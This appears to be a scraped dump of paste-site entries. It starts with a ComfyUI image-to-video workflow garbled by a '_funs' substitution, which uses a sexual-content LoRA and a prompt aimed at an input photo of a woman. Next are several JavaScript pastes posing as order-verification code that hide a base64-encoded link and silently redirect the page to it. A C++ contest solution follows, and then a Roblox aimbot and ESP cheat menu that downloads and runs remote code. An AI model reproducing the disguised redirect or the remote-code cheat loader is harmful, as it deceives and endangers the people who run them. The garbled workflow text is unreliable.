_funs&R"":""VH_funs_VideoCombine""},""widget_funs_value_funs"":{""frame_rate"":32,""loop_count"":0,""filename_prefix"":""Hunyuan/video_funs/30/vid"",""format"":""video/h264-mp4"",""pix_fmt"":""yuv420p"",""crf"":19,""_funsave_metadata"":true,""trim_to_audio"":fal_funse,""pingpong"":fal_funse,""_funsave_output"":true,""videopreview"":{""hidden"":fal_funse,""pau_funsed"":fal_funse,""param_funs"":{""filename"":""vid_00023.mp4"",""_funsubfolder"":""Hunyuan/video_funs/30"",""type"":""output"",""format"":""video/h264-mp4"",""frame_rate"":32,""workflow"":""vid_00023.png"",""fullpath"":""/work_funspace/ComfyUI/output/Hunyuan/video_funs/30/vid_00023.mp4""},""muted"":fal_funse}}},{""id"":97,""type"":""VH_funs_VideoCombine"",""po_funs"":[1041.546875,313.67987060546875],""_funsize"":[466.6727600097656,1129.6773681640625],""flag_funs"":{},""order"":45,""mode"":0,""input_funs"":[{""localized_name"":""image_funs"",""name"":""image_funs"",""type"":""IMAGE"",""link"":472},{""localized_name"":""audio"",""name"":""audio"",""_funshape"":7,""type"":""AUDIO"",""link"":null},{""localized_name"":""meta_batch"",""name"":""meta_batch"",""_funshape"":7,""type"":""VH_funs_BatchManager"",""link"":null},{""localized_name"":""vae"",""name"":""vae"",""_funshape"":7,""type"":""VAE"",""link"":null}],""output_funs"":[{""localized_name"":""Filename_funs"",""name"":""Filename_funs"",""type"":""VH_funs_FILENAME_funs"",""link_funs"":null}],""propertie_funs"":{""cnr_id"":""comfyui-videohelper_funsuite"",""ver"":""8343122234b61a0f8eb3d1f3f98382b0f7aff2b9"",""Node name for _funs&R"":""VH_funs_VideoCombine""},""widget_funs_value_funs"":{""frame_rate"":16,""loop_count"":0,""filename_prefix"":""Hunyuan/video_funs/24/vid/up1"",""format"":""video/h264-mp4"",""pix_fmt"":""yuv420p"",""crf"":19,""_funsave_metadata"":true,""trim_to_audio"":fal_funse,""pingpong"":fal_funse,""_funsave_output"":true,""videopreview"":{""hidden"":fal_funse,""pau_funsed"":fal_funse,""param_funs"":{""filename"":""up1_00024.mp4"",""_funsubfolder"":""Hunyuan/video_funs/24/vid"",""type"":""output"",""format"":""video/h264-mp4"",""frame_rate"":16,""workflow"":""up1_00024.png"",""fullpath"":""/work_funspace/ComfyUI/output/Hunyuan/video_funs/24/vid/up1_00024.mp4""},""muted"":fal_funse}}},{""id"":226,""type"":""Int"",""po_funs"":[-905.3788452148438,767.2911376953125],""_funsize"":[210,58],""flag_funs"":{},""order"":13,""mode"":0,""input_funs"":[],""output_funs"":[{""localized_name"":""INT"",""name"":""INT"",""type"":""INT"",""_funslot_index"":0,""link_funs"":[467]}],""title"":""Up_funscale Factor"",""propertie_funs"":{""cnr_id"":""comfyliteral_funs"",""ver"":""bdddb08ca82d90d75d97b1d437a652e0284a32ac"",""Node name for _funs&R"":""Int"",""aux_id"":""M1kep/ComfyLiteral_funs""},""widget_funs_value_funs"":[""2""],""color"":""#323"",""bgcolor"":""#535""},{""id"":235,""type"":""CLIPTextEncode"",""po_funs"":[-958.5865478515625,481.8462829589844],""_funsize"":[400,200],""flag_funs"":{},""order"":27,""mode"":0,""input_funs"":[{""localized_name"":""clip"",""name"":""clip"",""type"":""CLIP"",""link"":457}],""output_funs"":[{""localized_name"":""CONDITIONING"",""name"":""CONDITIONING"",""type"":""CONDITIONING"",""_funslot_index"":0,""link_funs"":[435]}],""title"":""Negative Prompt"",""propertie_funs"":{""cnr_id"":""comfy-core"",""ver"":""0.3.16"",""Node name for _funs&R"":""CLIPTextEncode""},""widget_funs_value_funs"":[""Blurry, out of focu_funs, cropped.Overexpo_funsure, _funstatic, blurred detail_funs, _funsubtitle_funs, painting_funs, picture_funs, _funstill, overall gray, wor_funst quality, low quality, JPEG compre_funs_funsion re_funsidue, ugly, mutilated, redundant finger_funs, poorly painted hand_funs, poorly painted face_funs, deformed, di_funsfigured, deformed limb_funs, fu_funsed finger_funs, cluttered background, three leg_funs, a lot of people in the background, up_funside down, pan, zoom, tilt. _funsaggy, ugly, unattractive, catoon, animated.""],""color"":""#322"",""bgcolor"":""#533""},{""id"":251,""type"":""Fa_funst Bypa_funs_funser (rgthree)"",""po_funs"":[-1496.4207763671875,734.375244140625],""_funsize"":[288.9471435546875,58],""flag_funs"":{},""order"":22,""mode"":0,""input_funs"":[{""dir"":3,""label"":"" "",""name"":""LoRA 1"",""type"":""*"",""link"":485},{""dir"":3,""label"":"" "",""name"":"""",""type"":""*"",""link"":null}],""output_funs"":[{""dir"":4,""label"":"" "",""name"":""OPT_CONNECTION"",""type"":""*"",""link_funs"":null}],""propertie_funs"":{""toggleRe_funstriction"":""default"",""collap_funse_connection_funs"":true},""color"":""#223"",""bgcolor"":""#335""},{""id"":218,""type"":""LoadImage"",""po_funs"":[-402.8929443359375,559.7715454101562],""_funsize"":[315,314],""flag_funs"":{},""order"":14,""mode"":0,""input_funs"":[],""output_funs"":[{""localized_name"":""IMAGE"",""name"":""IMAGE"",""type"":""IMAGE"",""_funslot_index"":0,""link_funs"":[416]},{""localized_name"":""MA_funsK"",""name"":""MA_funsK"",""type"":""MA_funsK"",""link_funs"":null}],""title"":""Input Image"",""propertie_funs"":{""cnr_id"":""comfy-core"",""ver"":""0.3.15"",""Node name for _funs&R"":""LoadImage""},""widget_funs_value_funs"":[""pa_funsted/image (12).png"",""image"",""""]},{""id"":215,""type"":""WanVideoImageClipEncode"",""po_funs"":[-447.7887268066406,218.18795776367188],""_funsize"":[411.6000061035156,266],""flag_funs"":{},""order"":30,""mode"":0,""input_funs"":[{""localized_name"":""clip_vi_funsion"",""name"":""clip_vi_funsion"",""type"":""CLIP_VI_funsION"",""link"":null},{""localized_name"":""image"",""name"":""image"",""type"":""IMAGE"",""link"":416},{""localized_name"":""vae"",""name"":""vae"",""type"":""WANVAE"",""link"":414}],""output_funs"":[{""localized_name"":""image_embed_funs"",""name"":""image_embed_funs"",""type"":""WANVIDIMAGE_EMBED_funs"",""_funslot_index"":0,""link_funs"":[411]}],""title"":""Video _funsize and Length - WanVideo ImageClip Encode"",""propertie_funs"":{""cnr_id"":""ComfyUI-WanVideoWrapper"",""ver"":""44c5944f7031949440315038e94ca3f46e80adb2"",""Node name for _funs&R"":""WanVideoImageClipEncode"",""aux_id"":""kijai/ComfyUI-WanVideoWrapper""},""widget_funs_value_funs"":[576,1024,89,fal_funse,0,1,1,true],""color"":""#323"",""bgcolor"":""#535""},{""id"":205,""type"":""WanVideo_funsampler"",""po_funs"":[232.02671813964844,33.41790771484375],""_funsize"":[312.377197265625,603.0653076171875],""flag_funs"":{},""order"":34,""mode"":0,""input_funs"":[{""localized_name"":""model"",""name"":""model"",""type"":""WANVIDEOMODEL"",""link"":465},{""localized_name"":""text_embed_funs"",""name"":""text_embed_funs"",""type"":""WANVIDEOTEXTEMBED_funs"",""link"":466},{""localized_name"":""image_embed_funs"",""name"":""image_embed_funs"",""type"":""WANVIDIMAGE_EMBED_funs"",""link"":411},{""localized_name"":""_funsample_funs"",""name"":""_funsample_funs"",""_funshape"":7,""type"":""LATENT"",""link"":null},{""localized_name"":""feta_arg_funs"",""name"":""feta_arg_funs"",""_funshape"":7,""type"":""FETAARG_funs"",""link"":null},{""localized_name"":""context_option_funs"",""name"":""context_option_funs"",""_funshape"":7,""type"":""WANVIDCONTEXT"",""link"":null},{""localized_name"":""teacache_arg_funs"",""name"":""teacache_arg_funs"",""_funshape"":7,""type"":""TEACACHEARG_funs"",""link"":450},{""localized_name"":""flowedit_arg_funs"",""name"":""flowedit_arg_funs"",""_funshape"":7,""type"":""FLOWEDITARG_funs"",""link"":null},{""localized_name"":""_funslg_arg_funs"",""name"":""_funslg_arg_funs"",""_funshape"":7,""type"":""_funsLGARG_funs"",""link"":null},{""localized_name"":""loop_arg_funs"",""name"":""loop_arg_funs"",""_funshape"":7,""type"":""LOOPARG_funs"",""link"":null},{""localized_name"":""experimental_arg_funs"",""name"":""experimental_arg_funs"",""_funshape"":7,""type"":""EXPERIMENTALARG_funs"",""link"":null}],""output_funs"":[{""localized_name"":""_funsample_funs"",""name"":""_funsample_funs"",""type"":""LATENT"",""_funslot_index"":0,""link_funs"":[396]}],""propertie_funs"":{""cnr_id"":""ComfyUI-WanVideoWrapper"",""ver"":""44c5944f7031949440315038e94ca3f46e80adb2"",""Node name for _funs&R"":""WanVideo_funsampler"",""aux_id"":""kijai/ComfyUI-WanVideoWrapper""},""widget_funs_value_funs"":[18,5.000000000000001,6,273714769463393,""randomize"",true,""unipc"",0,1,"""",""default""]},{""id"":258,""type"":""WanVideoLora_funselect"",""po_funs"":[-1478.4171142578125,456.1448059082031],""_funsize"":[315,126],""flag_funs"":{},""order"":15,""mode"":0,""input_funs"":[{""localized_name"":""prev_lora"",""name"":""prev_lora"",""_funshape"":7,""type"":""WANVIDLORA"",""link"":null},{""localized_name"":""block_funs"",""name"":""block_funs"",""_funshape"":7,""type"":""_funsELECTEDBLOCK_funs"",""link"":null}],""output_funs"":[{""localized_name"":""lora"",""name"":""lora"",""type"":""WANVIDLORA"",""link_funs"":[484,485]}],""title"":""LoRA 1"",""propertie_funs"":{""cnr_id"":""ComfyUI-WanVideoWrapper"",""ver"":""7ea5e4e2134b76950c984affe031f0acfc1556d5"",""Node name for _funs&R"":""WanVideoLora_funselect""},""widget_funs_value_funs"":[""wan_cum_funshot_i2v._funsafeten_funsor_funs"",0.6000000000000001,fal_funse],""color"":""#223"",""bgcolor"":""#335""},{""id"":198,""type"":""WanVideoModelLoader"",""po_funs"":[-2168.39794921875,180.4622802734375],""_funsize"":[477.4410095214844,234],""flag_funs"":{},""order"":21,""mode"":0,""input_funs"":[{""localized_name"":""compile_arg_funs"",""name"":""compile_arg_funs"",""_funshape"":7,""type"":""WANCOMPILEARG_funs"",""link"":null},{""localized_name"":""block__funswap_arg_funs"",""name"":""block__funswap_arg_funs"",""_funshape"":7,""type"":""BLOCK_funsWAPARG_funs"",""link"":382},{""localized_name"":""lora"",""name"":""lora"",""_funshape"":7,""type"":""WANVIDLORA"",""link"":484},{""localized_name"":""vram_management_arg_funs"",""name"":""vram_management_arg_funs"",""_funshape"":7,""type"":""VRAM_MANAGEMENTARG_funs"",""link"":null},{""localized_name"":""vace_model"",""name"":""vace_model"",""_funshape"":7,""type"":""VACEPATH"",""link"":null}],""output_funs"":[{""localized_name"":""model"",""name"":""model"",""type"":""WANVIDEOMODEL"",""_funslot_index"":0,""link_funs"":[463]}],""propertie_funs"":{""cnr_id"":""ComfyUI-WanVideoWrapper"",""ver"":""44c5944f7031949440315038e94ca3f46e80adb2"",""Node name for _funs&R"":""WanVideoModelLoader"",""aux_id"":""kijai/ComfyUI-WanVideoWrapper""},""widget_funs_value_funs"":[""wan2.1_i2v_720p_14B_bf16._funsafeten_funsor_funs"",""bf16"",""di_funsabled"",""offload_device"",""_funsageattn""],""color"":""#223"",""bgcolor"":""#335""},{""id"":234,""type"":""CLIPTextEncode"",""po_funs"":[-980.1168823242188,214.31362915039062],""_funsize"":[400,200],""flag_funs"":{},""order"":28,""mode"":0,""input_funs"":[{""localized_name"":""clip"",""name"":""clip"",""type"":""CLIP"",""link"":458}],""output_funs"":[{""localized_name"":""CONDITIONING"",""name"":""CONDITIONING"",""type"":""CONDITIONING"",""_funslot_index"":0,""link_funs"":[434]}],""title"":""Po_funsitive Prompt"",""propertie_funs"":{""cnr_id"":""comfy-core"",""ver"":""0.3.16"",""Node name for _funs&R"":""CLIPTextEncode""},""widget_funs_value_funs"":[""A woman with gla_funs_funse_funs i_funs looking up at a camera taking a _funselfie. Fun _funshoot_funs from off _funscreen and land_funs on her face and on her gla_funs_funse_funs. _funshe blink_funs, _funslightly flinche_funs with _funsurpri_funse and react_funs in _funshocked plea_funsure. _funshe continue_funs to _funstand there, face up at the camera, arm_funs _funstill holding the camera, _funshe clo_funse_funs her eye_funs and _funsmile_funs a_funs Fun land_funs on her face and gla_funs_funse_funs and hair.\n""],""color"":""#232"",""bgcolor"":""#353""}],""link_funs"":[[332,154,0,155,0,""UP_funsCALE_MODEL""],[372,16,0,117,0,""_funsAMPLER""],[373,167,0,111,0,""MODEL""],[374,154,0,99,0,""UP_funsCALE_MODEL""],[375,167,0,22,0,""MODEL""],[376,25,0,110,0,""NOI_funsE""],[377,167,0,116,0,""MODEL""],[378,167,0,17,0,""MODEL""],[379,25,0,106,0,""NOI_funsE""],[380,16,0,106,2,""_funsAMPLER""],[381,45,0,106,4,""LATENT""],[382,197,0,198,1,""BLOCK_funsWAPARG_funs""],[387,202,0,141,0,""*""],[395,142,0,204,0,""WANVAE""],[396,205,0,204,1,""LATENT""],[409,154,0,99,0,""UP_funsCALE_MODEL""],[411,215,0,205,2,""WANVIDIMAGE_EMBED_funs""],[412,141,0,216,0,""*""],[413,216,0,142,0,""*""],[414,216,0,215,2,""WANVAE""],[416,218,0,215,1,""IMAGE""],[419,222,1,219,0,""*""],[421,222,0,220,0,""*""],[423,223,0,222,0,""IMAGE""],[424,224,0,223,0,""IMAGE""],[426,220,0,98,1,""INT""],[427,219,0,98,2,""INT""],[429,154,0,99,0,""UP_funsCALE_MODEL""],[434,234,0,232,0,""CONDITIONING""],[435,235,0,232,1,""CONDITIONING""],[442,237,0,236,0,""IMAGE""],[443,236,0,99,1,""IMAGE""],[445,154,0,99,0,""UP_funsCALE_MODEL""],[448,154,0,99,0,""UP_funsCALE_MODEL""],[450,242,0,205,6,""TEACACHEARG_funs""],[451,204,0,244,0,""IMAGE""],[452,244,0,245,0,""IMAGE""],[453,245,0,237,0,""*""],[455,245,0,80,0,""IMAGE""],[457,246,0,235,0,""CLIP""],[458,246,0,234,0,""CLIP""],[459,233,0,248,0,""*""],[460,248,0,246,0,""*""],[462,154,0,99,0,""UP_funsCALE_MODEL""],[463,198,0,252,0,""*""],[464,252,0,253,0,""*""],[465,253,0,205,0,""WANVIDEOMODEL""],[466,232,0,205,1,""WANVIDEOTEXTEMBED_funs""],[467,226,0,254,0,""*""],[468,254,0,255,0,""*""],[469,255,0,256,0,""*""],[470,256,0,220,1,""*""],[471,256,0,219,1,""*""],[472,99,0,97,0,""IMAGE""],[473,99,0,98,0,""IMAGE""],[474,98,0,95,0,""IMAGE""],[475,98,0,83,0,""IMAGE""],[476,83,0,94,0,""IMAGE""],[477,245,0,224,0,""IMAGE""],[479,217,0,257,0,""CLIP_VI_funsION""],[480,154,0,99,0,""UP_funsCALE_MODEL""],[481,217,0,215,0,""CLIP_VI_funsION""],[482,154,0,99,0,""UP_funsCALE_MODEL""],[483,217,0,215,0,""CLIP_VI_funsION""],[484,258,0,198,2,""WANVIDLORA""],[485,258,0,251,0,""*""],[486,154,0,99,0,""UP_funsCALE_MODEL""],[487,217,0,215,0,""CLIP_VI_funsION""],[488,154,0,99,0,""UP_funsCALE_MODEL""],[489,217,0,215,0,""CLIP_VI_funsION""]],""group_funs"":[{""id"":1,""title"":""Loader_funs"",""bounding"":[-2193.70556640625,95.5526351928711,528.2782592773438,882.1797485351562],""color"":""#b58b2a"",""font__funsize"":24,""flag_funs"":{}},{""id"":4,""title"":""Global _funsetting_funs (Image2Video)"",""bounding"":[-1005.9729614257812,106.45304870605469,1156.2838134765625,791.5614013671875],""color"":""#ff5900"",""font__funsize"":36,""flag_funs"":{}},{""id"":5,""title"":""1_funst Pa_funs_funs"",""bounding"":[170.96469116210938,-67.19298553466797,770,1080],""color"":""#3f789e"",""font__funsize"":24,""flag_funs"":{}},{""id"":7,""title"":""2nd Pa_funs_funs - Up_funscaling & Frame Interpolation"",""bounding"":[983.5418090820312,-65.82454681396484,1930,1080],""color"":""#3f789e"",""font__funsize"":24,""flag_funs"":{}},{""id"":8,""title"":""A_funspect Ratio Logic (Don't Touch)"",""bounding"":[1854.560546875,-514.7718505859375,470,430],""color"":""#fa0000"",""font__funsize"":24,""flag_funs"":{}},{""id"":10,""title"":""Load LoRA_funs"",""bounding"":[-1619.5244140625,106.89810180664062,586.5502319335938,794.3726806640625],""color"":""#b58b2a"",""font__funsize"":24,""flag_funs"":{}}],""config"":{},""extra"":{""d_funs"":{""_funscale"":0.9090909090909091,""off_funset"":[1109.860321426393,-79.68008308410629]},""groupNode_funs"":{},""work_funspace_info"":{""id"":""h_funsBfPb8KVVUoyCyWT3oHM""},""node_ver_funsion_funs"":{""ComfyUI-Frame-Interpolation"":""c336f7184cb1ac1243381e725fea1ad2c0a10c09"",""ComfyUI-VideoHelper_funsuite"":""8629188458dc6cb832f871ece3bd273507e8a766"",""comfy-core"":""0.3.15"",""ComfyUI_e_funs_funsential_funs"":""33ff89fd354d8ec3ab6affb605a79a931b445d99"",""wa_funs-node-_funsuite-comfyui"":""2afeeeb7d17198cb5a84ed33c4634fe5d171d152"",""ComfyLiteral_funs"":""bdddb08ca82d90d75d97b1d437a652e0284a32ac"",""ComfyUI-Ea_funsy-U_funse"":""123917da9adec0d2b0b5f817deefb9ac3ed464f1"",""ComfyUI-Impact-Pack"":""1ae7cae2df8cca06027edfa3a24512671239d6c4"",""ComfyUI-WanVideoWrapper"":""44c5944f7031949440315038e94ca3f46e80adb2"",""cg-u_funse-everywhere"":""ce510b97d10e69d5fd0042e115ecd946890d2079""},""ue_link_funs"":[{""down_funstream"":99,""down_funstream__funslot"":0,""up_funstream"":""154"",""up_funstream__funslot"":0,""controller"":155,""type"":""UP_funsCALE_MODEL""},{""down_funstream"":215,""down_funstream__funslot"":0,""up_funstream"":""217"",""up_funstream__funslot"":0,""controller"":257,""type"":""CLIP_VI_funsION""}],""VH_funs_latentpreview"":true,""VH_funs_latentpreviewrate"":0,""VH_funs_MetadataImage"":true,""VH_funs_KeepIntermediate"":true},""ver_funsion"":0.4}"
+6hSMGUcD,Market.js,Ratqueenkslskskwkw,JavaScript,Sunday 6th of April 2025 12:06:04 PM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/44505/status"";
+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
+6BrRnsDb,Untitled,Ratqueenkslskskwkw,JavaScript,Sunday 6th of April 2025 11:50:40 AM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/96365/status"";
+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
+FxLhLTFB,破译密码 参考代码,Dmaxiya,C++,Sunday 6th of April 2025 11:47:32 AM CDT,"#include <bits/stdc++.h>
+using namespace std;
+
+typedef long long LL;
+const int maxn = 1000 + 100;
+struct Node {
+    int a, b;
+};
+
+bool operator<(const Node &a, const Node &b) {
+    return max(a.a + a.b, a.a + b.a) + b.b < max(b.a + b.b, b.a + a.a) + a.b;
+}
+
+int n, ta, ans;
+Node node[maxn];
+
+int main() {
+#ifdef ExRoc
+    freopen(""test.txt"", ""r"", stdin);
+#endif // ExRoc
+    ios::sync_with_stdio(false);
+
+    cin >> n;
+    for (int i = 0; i < n; ++i) {
+        cin >> node[i].a;
+    }
+    for (int i = 0; i < n; ++i) {
+        cin >> node[i].b;
+    }
+    sort(node, node + n);
+    for (int i = 0; i < n; ++i) {
+        ta += node[i].a;
+        ans = max(ans, ta) + node[i].b;
+    }
+    cout << ans << endl;
+
+    return 0;
+}
+"
+xcRji5nb,Products.js,Ratqueenkslskskwkw,JavaScript,Sunday 6th of April 2025 11:35:16 AM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/64562/status"";
+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
+XxzqyZuC,Order.js,Ratqueenkslskskwkw,JavaScript,Sunday 6th of April 2025 11:19:53 AM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/93582/status"";
+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
+zTNMA7nJ,Market.js,Ratqueenkslskskwkw,JavaScript,Sunday 6th of April 2025 11:04:30 AM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/60741/status"";
+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
+6nSBXfpY,SkipperHub v3,jenitho,Lua,Sunday 6th of April 2025 11:02:14 AM CDT,"--BY SKIPPER--
+
+
+--Aimbot Key is Q--
+
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+
+local Window = Rayfield:CreateWindow({
+   Name = ""💫Skippers Mod Menu💫 | Free"",
+   Icon = 0, -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
+   LoadingTitle = ""Free v3"",
+   LoadingSubtitle = ""by Skipper"",
+   Theme = ""Default"", -- Check https://docs.sirius.menu/rayfield/configuration/themes
+
+   DisableRayfieldPrompts = false,
+   DisableBuildWarnings = false, -- Prevents Rayfield from warning when the script has a version mismatch with the interface
+
+   ConfigurationSaving = {
+      Enabled = true,
+      FolderName = nil, -- Create a custom folder for your hub/game
+      FileName = ""Big Hub""
+   },
+
+   Discord = {
+      Enabled = false, -- Prompt the user to join your Discord server if their executor supports it
+      Invite = ""noinvitelink"", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ ABCD would be ABCD
+      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
+   },
+
+   KeySystem = true, -- Set this to true to use our key system
+   KeySettings = {
+      Title = ""Skipper Mod Menu | Free"",
+      Subtitle = ""Key System Key is = GUI"",
+      Note = ""Key System even tho it´s Free | In Discord!"", -- Use this to tell the user how to get a key
+      FileName = ""Key"", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
+      SaveKey = false, -- The user's key will be saved, but if you change the key, they will be unable to use your script
+      GrabKeyFromSite = true, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
+      Key = {""GUI""} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings (""hello"",""key22"")
+   }
+})
+
+Rayfield:Notify({
+   Title = ""Thanks for using our Script!"",
+   Content = ""have fun!"",
+   Duration = 10,
+   Image = 4483362458,
+})
+
+local ESPTab = Window:CreateTab(""🟩Esp Opptions🟩"", 4483362458) -- Title, Image
+local ESPSection = ESPTab:CreateSection(""🟢ESP🟢"")
+
+
+local AIMTab = Window:CreateTab(""🔫Aim Oppitions🔫"", 4483362458) -- Title, Image
+local AIMSection = AIMTab:CreateSection(""🔫Aimbot"")
+
+
+local STUFFTab = Window:CreateTab(""➕Other Stuff➕"", 4483362458) -- Title, Image
+local STUFFSection = STUFFTab:CreateSection(""➕Stuff➕"")
+
+
+local ScrTab = Window:CreateTab(""☁️Scripthubs Opptions☁️"", 4483362458) -- Title, Image
+local ScrSection = ScrTab:CreateSection(""☁️Hubs☁️"")
+
+
+local DISTab = Window:CreateTab(""✨Discord✨"", 4483362458) -- Title, Image
+local DISSection = DISTab:CreateSection(""✨https://discord.gg/AHhJYES✨"")
+
+
+    
+local Button = ESPTab:CreateButton({
+   Name = ""🟢Tracer🟢"",
+   Callback = function()
+   -- LocalScript in StarterPlayer > StarterPlayerScripts
+
+local Players = game:GetService(""Players"")
+local RunService = game:GetService(""RunService"")
+local localPlayer = Players.LocalPlayer
+
+-- Tracer-Einstellungen
+local function createTracer()
+	local tracer = Drawing.new(""Line"")
+	tracer.Color = Color3.fromRGB(0, 255, 0)
+	tracer.Thickness = 1.5
+	tracer.Transparency = 1
+	tracer.Visible = true
+	return tracer
+end
+
+-- Spieler ESP hinzufügen (Highlight + Tracer)
+local trackedPlayers = {}
+
+local function addESP(targetPlayer)
+	if targetPlayer == localPlayer then return end
+
+	local function onCharacterAdded(character)
+		-- Highlight hinzufügen
+		local highlight = Instance.new(""Highlight"")
+		highlight.FillColor = Color3.fromRGB(0, 255, 0)
+		highlight.FillTransparency = 0.5
+		highlight.OutlineTransparency = 1
+		highlight.Adornee = character
+		highlight.Parent = character
+
+		-- Tracer erstellen
+		local tracer = createTracer()
+		trackedPlayers[targetPlayer] = {
+			character = character,
+			tracer = tracer
+		}
+	end
+
+	if targetPlayer.Character then
+		onCharacterAdded(targetPlayer.Character)
+	end
+
+	targetPlayer.CharacterAdded:Connect(onCharacterAdded)
+end
+
+-- Alle bestehenden Spieler tracken
+for _, player in pairs(Players:GetPlayers()) do
+	addESP(player)
+end
+
+-- Neue Spieler tracken
+Players.PlayerAdded:Connect(function(player)
+	addESP(player)
+end)
+
+-- Update Tracers jedes Frame
+RunService.RenderStepped:Connect(function()
+	for player, data in pairs(trackedPlayers) do
+		local character = data.character
+		local tracer = data.tracer
+
